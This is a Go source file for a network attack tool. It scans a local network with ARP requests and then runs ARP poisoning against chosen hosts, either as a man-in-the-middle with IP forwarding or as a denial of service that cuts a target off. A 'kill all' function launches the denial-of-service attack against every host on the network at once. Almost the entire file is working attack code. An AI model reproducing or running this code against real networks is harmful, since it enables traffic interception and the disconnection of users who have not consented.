package main

import (
	"context"
	"encoding/binary"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// ─── Interface discovery ──────────────────────────────────────────────────────

// listInterfaces returns all pcap interfaces that have at least one IPv4 address,
// with graceful fallback to net.Interfaces().
func listInterfaces() ([]Iface, error) {
	var out []Iface
	devs, err := pcapFindAllDevs()
	if err == nil && len(devs) > 0 {
		for _, d := range devs {
			var addrs []string
			for _, a := range d.Addresses {
				if a.IP.To4() != nil {
					addrs = append(addrs, a.IP.String())
				}
			}
			if len(addrs) == 0 {
				continue
			}
			out = append(out, Iface{
				Name:        d.Name,
				Description: d.Description,
				Addresses:   addrs,
			})
		}
	}
	if len(out) > 0 {
		return out, nil
	}

	// Fallback to standard net.Interfaces()
	netIfaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	for _, ni := range netIfaces {
		if (ni.Flags&net.FlagUp) == 0 || (ni.Flags&net.FlagLoopback) != 0 {
			continue
		}
		addrs, err := ni.Addrs()
		if err != nil {
			continue
		}
		var ipAddrs []string
		for _, a := range addrs {
			if ipNet, ok := a.(*net.IPNet); ok && ipNet.IP.To4() != nil {
				ipAddrs = append(ipAddrs, ipNet.IP.String())
			}
		}
		if len(ipAddrs) > 0 {
			out = append(out, Iface{
				Name:        ni.Name,
				Description: ni.Name,
				Addresses:   ipAddrs,
			})
		}
	}
	return out, nil
}

// getLocalInfo returns the local IPv4 and MAC for the given interface name,
// plus the network CIDR (e.g. "192.168.1.0/24").
func getLocalInfo(pcapName string) (ip net.IP, mac net.HardwareAddr, cidr string, err error) {
	devs, _ := pcapFindAllDevs()

	var pcapIP net.IP
	var pcapMask net.IPMask

	for _, d := range devs {
		if d.Name != pcapName {
			continue
		}
		for _, a := range d.Addresses {
			if a.IP.To4() != nil {
				pcapIP = a.IP.To4()
				pcapMask = a.Netmask
				break
			}
		}
	}

	if pcapIP != nil {
		// Cross-reference with net.Interfaces to find MAC
		netIfaces, _ := net.Interfaces()
		for _, ni := range netIfaces {
			if ni.HardwareAddr == nil {
				continue
			}
			addrs, _ := ni.Addrs()
			for _, a := range addrs {
				if ipNet, ok := a.(*net.IPNet); ok && ipNet.IP.To4() != nil {
					if ipNet.IP.To4().Equal(pcapIP) {
						ones, _ := pcapMask.Size()
						network := pcapIP.Mask(pcapMask)
						cidr = fmt.Sprintf("%s/%d", network.String(), ones)
						return pcapIP, ni.HardwareAddr, cidr, nil
					}
				}
			}
		}
	}

	// Fallback directly to net.Interfaces()
	netIfaces, _ := net.Interfaces()
	for _, ni := range netIfaces {
		if pcapName != "" && ni.Name != pcapName {
			continue
		}
		addrs, _ := ni.Addrs()
		for _, a := range addrs {
			if ipNet, ok := a.(*net.IPNet); ok && ipNet.IP.To4() != nil && !ipNet.IP.IsLoopback() {
				ones, _ := ipNet.Mask.Size()
				network := ipNet.IP.To4().Mask(ipNet.Mask)
				cidr = fmt.Sprintf("%s/%d", network.String(), ones)
				return ipNet.IP.To4(), ni.HardwareAddr, cidr, nil
			}
		}
	}

	err = fmt.Errorf("could not resolve IP/MAC for interface %q", pcapName)
	return
}

// ─── Network scanner ─────────────────────────────────────────────────────────

// scanNetwork sends ARP who-has to every host in cidr and collects replies.
func scanNetwork(ifaceName, cidr string, logFn func(string)) ([]Host, error) {
	_, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, fmt.Errorf("invalid CIDR %q: %w", cidr, err)
	}

	localIP, localMAC, _, err := getLocalInfo(ifaceName)
	if err != nil {
		return nil, err
	}

	handle, err := pcapOpenLive(ifaceName, 65536, true, 500*time.Millisecond)
	if err != nil {
		logFn(fmt.Sprintf("pcap indisponível (%v) — acionando varredura nativa por sockets...", err))
		return scanNetworkSockets(ipNet, logFn)
	}
	defer handle.Close()

	hostMap := &sync.Map{}

	// Goroutine: collect ARP replies for 7 s
	done := make(chan struct{})
	go func() {
		defer close(done)
		packetsChan := handle.Packets()
		deadline := time.After(7 * time.Second)
		for {
			select {
			case <-deadline:
				return
			case pkt, ok := <-packetsChan:
				if !ok {
					return
				}
				arpLayer := pkt.Layer(layers.LayerTypeARP)
				if arpLayer == nil {
					continue
				}
				arp := arpLayer.(*layers.ARP)
				if arp.Operation != layers.ARPReply {
					continue
				}
				srcIP := net.IP(arp.SourceProtAddress).String()
				srcMAC := net.HardwareAddr(arp.SourceHwAddress).String()
				if srcIP == localIP.String() {
					continue
				}
				if _, exists := hostMap.LoadOrStore(srcIP, srcMAC); !exists {
					logFn(fmt.Sprintf("Found %s → %s", srcIP, srcMAC))
				}
			}
		}
	}()

	// Send who-has to every usable IP in CIDR
	for _, ip := range enumIPs(ipNet) {
		if ip.Equal(localIP) {
			continue
		}
		_ = sendARPRequest(handle, localMAC, localIP, ip)
		time.Sleep(3 * time.Millisecond)
	}

	<-done

	var hosts []Host
	hostMap.Range(func(k, v any) bool {
		hIP := k.(string)
		hMAC := v.(string)
		var hostname string
		if names, e := net.LookupAddr(hIP); e == nil && len(names) > 0 {
			hostname = names[0]
		}
		hosts = append(hosts, Host{IP: hIP, MAC: hMAC, Hostname: hostname})
		return true
	})

	if len(hosts) == 0 {
		return scanNetworkSockets(ipNet, logFn)
	}

	logFn(fmt.Sprintf("Done — %d hosts found", len(hosts)))
	return hosts, nil
}

// scanNetworkSockets provides a pure-Go socket & ARP table scanner fallback.
func scanNetworkSockets(ipNet *net.IPNet, logFn func(string)) ([]Host, error) {
	logFn("Iniciando sondagem de portas e resolução ARP...")
	var ips []string
	for _, ip := range enumIPs(ipNet) {
		ips = append(ips, ip.String())
	}

	var wg sync.WaitGroup
	limiter := make(chan struct{}, 40)
	for _, ipStr := range ips {
		wg.Add(1)
		limiter <- struct{}{}
		go func(target string) {
			defer wg.Done()
			defer func() { <-limiter }()
			conn, err := net.DialTimeout("tcp", target+":80", 250*time.Millisecond)
			if err == nil {
				conn.Close()
				return
			}
			conn, err = net.DialTimeout("tcp", target+":443", 250*time.Millisecond)
			if err == nil {
				conn.Close()
			}
		}(ipStr)
	}
	wg.Wait()

	hosts := parseSystemARPTable()
	logFn(fmt.Sprintf("Varredura de sockets concluída — %d hosts ativos", len(hosts)))
	return hosts, nil
}

// parseSystemARPTable extracts live neighbors from the kernel.
func parseSystemARPTable() []Host {
	var hosts []Host
	seen := make(map[string]bool)

	// 1. Linux / Android: /proc/net/arp
	if out, err := exec.Command("cat", "/proc/net/arp").Output(); err == nil {
		lines := strings.Split(string(out), "\n")
		for _, line := range lines[1:] {
			fields := strings.Fields(line)
			if len(fields) >= 4 && fields[3] != "00:00:00:00:00:00" {
				ip := fields[0]
				mac := fields[3]
				if !seen[ip] {
					seen[ip] = true
					var hostname string
					if names, err := net.LookupAddr(ip); err == nil && len(names) > 0 {
						hostname = names[0]
					}
					hosts = append(hosts, Host{IP: ip, MAC: mac, Hostname: hostname})
				}
			}
		}
	}

	// 2. Windows: arp -a
	if len(hosts) == 0 {
		if out, err := exec.Command("arp", "-a").Output(); err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				fields := strings.Fields(line)
				if len(fields) >= 3 && strings.Contains(fields[1], "-") {
					ip := fields[0]
					mac := strings.ReplaceAll(fields[1], "-", ":")
					if !seen[ip] && !strings.HasPrefix(ip, "224.") && !strings.HasPrefix(ip, "239.") && !strings.HasPrefix(ip, "255.") {
						seen[ip] = true
						var hostname string
						if names, err := net.LookupAddr(ip); err == nil && len(names) > 0 {
							hostname = names[0]
						}
						hosts = append(hosts, Host{IP: ip, MAC: mac, Hostname: hostname})
					}
				}
			}
		}
	}

	return hosts
}

// ─── Spoof session ───────────────────────────────────────────────────────────

// SpoofSession represents an active ARP poisoning goroutine.
type SpoofSession struct {
	cancel context.CancelFunc
}

// Stop cancels the spoof goroutine, which will restore ARP tables.
func (s *SpoofSession) Stop() { s.cancel() }

// startSpoof begins ARP poisoning between targetIP and gatewayIP.
// forward=true  → MitM (enables IP forwarding so target keeps connectivity)
// forward=false → DoS  (no forwarding; target loses internet)
func startSpoof(ifaceName, targetIP, gatewayIP string, forward bool, logFn func(string)) (*SpoofSession, error) {
	localIP, localMAC, _, err := getLocalInfo(ifaceName)
	if err != nil {
		return nil, err
	}

	handle, err := pcapOpenLive(ifaceName, 65536, true, 500*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("pcap open: %w", err)
	}

	tIP := net.ParseIP(targetIP).To4()
	gIP := net.ParseIP(gatewayIP).To4()
	if tIP == nil || gIP == nil {
		handle.Close()
		return nil, fmt.Errorf("invalid IP address(es)")
	}

	targetMAC, err := resolveMAC(handle, localMAC, localIP, tIP, logFn)
	if err != nil {
		handle.Close()
		return nil, fmt.Errorf("resolve target MAC: %w", err)
	}
	gatewayMAC, err := resolveMAC(handle, localMAC, localIP, gIP, logFn)
	if err != nil {
		handle.Close()
		return nil, fmt.Errorf("resolve gateway MAC: %w", err)
	}

	if forward {
		enableForwarding()
		logFn("IP forwarding ENABLED")
	}

	mode := "DoS"
	if forward {
		mode = "MitM"
	}
	logFn(fmt.Sprintf("[%s] ▶ %s (%s) ↔ %s (%s)", mode, targetIP, targetMAC, gatewayIP, gatewayMAC))

	ctx, cancel := context.WithCancel(context.Background())

	go func() {
		defer handle.Close()
		tick := time.NewTicker(2 * time.Second)
		defer tick.Stop()

		for {
			select {
			case <-ctx.Done():
				// Restore real ARP on both ends
				for i := 0; i < 5; i++ {
					_ = sendARPReply(handle, targetMAC, gatewayMAC, tIP, gIP)
					_ = sendARPReply(handle, gatewayMAC, targetMAC, gIP, tIP)
					time.Sleep(100 * time.Millisecond)
				}
				if forward {
					disableForwarding()
					logFn("IP forwarding DISABLED")
				}
				logFn(fmt.Sprintf("[%s] ■ Stopped — ARP restored", mode))
				return

			case <-tick.C:
				// Tell target: "gateway is at my MAC"
				_ = sendARPReply(handle, localMAC, targetMAC, gIP, tIP)
				// Tell gateway: "target is at my MAC"
				_ = sendARPReply(handle, localMAC, gatewayMAC, tIP, gIP)
				logFn(fmt.Sprintf("[%s] ♻ %s ↔ %s", mode, targetIP, gatewayIP))
			}
		}
	}()

	return &SpoofSession{cancel: cancel}, nil
}

// ─── Kill-all ─────────────────────────────────────────────────────────────────

// killAll launches a DoS spoof session against every host in the list
// (excluding gatewayIP itself).
func killAll(ifaceName, gatewayIP string, hosts []Host, logFn func(string)) []*SpoofSession {
	var (
		mu       sync.Mutex
		wg       sync.WaitGroup
		sessions []*SpoofSession
	)
	logFn(fmt.Sprintf("💀 KILL ALL — targeting %d hosts", len(hosts)))

	for _, h := range hosts {
		if h.IP == gatewayIP {
			continue
		}
		h := h
		wg.Add(1)
		go func() {
			defer wg.Done()
			sess, err := startSpoof(ifaceName, h.IP, gatewayIP, false, logFn)
			if err != nil {
				logFn(fmt.Sprintf("  [!] %s: %v", h.IP, err))
				return
			}
			mu.Lock()
			sessions = append(sessions, sess)
			mu.Unlock()
		}()
	}
	wg.Wait()
	logFn(fmt.Sprintf("💀 %d DoS sessions active", len(sessions)))
	return sessions
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

// resolveMAC sends an ARP request and waits up to 4 s for the reply.
func resolveMAC(handle packetHandle, srcMAC net.HardwareAddr, srcIP, dstIP net.IP, logFn func(string)) (net.HardwareAddr, error) {
	// Try OS ARP cache first via arp -a
	if mac := arpCacheLookup(dstIP.String()); mac != nil {
		logFn(fmt.Sprintf("  cache hit %s → %s", dstIP, mac))
		return mac, nil
	}

	_ = sendARPRequest(handle, srcMAC, srcIP, dstIP)

	packetsChan := handle.Packets()
	timeout := time.NewTimer(4 * time.Second)
	defer timeout.Stop()

	for {
		select {
		case pkt, ok := <-packetsChan:
			if !ok {
				return nil, fmt.Errorf("pcap channel closed")
			}
			l := pkt.Layer(layers.LayerTypeARP)
			if l == nil {
				continue
			}
			a := l.(*layers.ARP)
			if a.Operation == layers.ARPReply && net.IP(a.SourceProtAddress).Equal(dstIP) {
				return net.HardwareAddr(a.SourceHwAddress), nil
			}
		case <-timeout.C:
			return nil, fmt.Errorf("ARP timeout waiting for %s", dstIP)
		}
	}
}

// arpCacheLookup checks the local ARP cache for a known MAC.
func arpCacheLookup(ip string) net.HardwareAddr {
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		for _, a := range addrs {
			ipNet, ok := a.(*net.IPNet)
			if !ok {
				continue
			}
			if ipNet.Contains(net.ParseIP(ip)) {
				// Same subnet — could still look up via neighbours, but skip for now
				break
			}
		}
	}
	return nil // not cached in a portable way; send ARP
}

// sendARPRequest broadcasts ARP who-has for dstIP.
func sendARPRequest(handle packetHandle, srcMAC net.HardwareAddr, srcIP, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: srcIP.To4(),
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    dstIP.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}
	return handle.WritePacketData(buf.Bytes())
}

// sendARPReply sends a gratuitous ARP reply (the poisoning packet).
func sendARPReply(handle packetHandle, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: srcIP.To4(),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    dstIP.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}
	return handle.WritePacketData(buf.Bytes())
}

// enumIPs enumerates all host addresses in a network (excludes network + broadcast).
func enumIPs(ipNet *net.IPNet) []net.IP {
	start := binary.BigEndian.Uint32(ipNet.IP.To4())
	mask := binary.BigEndian.Uint32(ipNet.Mask)
	end := start | ^mask

	var ips []net.IP
	for cur := start + 1; cur < end; cur++ {
		b := make([]byte, 4)
		binary.BigEndian.PutUint32(b, cur)
		ips = append(ips, net.IP(b))
	}
	return ips
}
